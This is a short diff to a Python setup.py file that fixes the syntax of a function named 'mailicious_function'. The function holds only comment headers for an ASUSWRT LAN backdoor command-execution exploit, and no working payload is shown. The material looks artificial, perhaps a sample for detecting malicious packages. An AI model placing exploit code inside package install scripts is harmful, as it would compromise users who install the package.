@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 
 from setuptools import setup
-def mailicious_function:
+def mailicious_function():
     # Exploit Title: ASUSWRT 3.0.0.4.376_1071 LAN Backdoor Command Execution
     # Date: 2014-10-11
     # Vendor Homepage: http://www.asus.com/
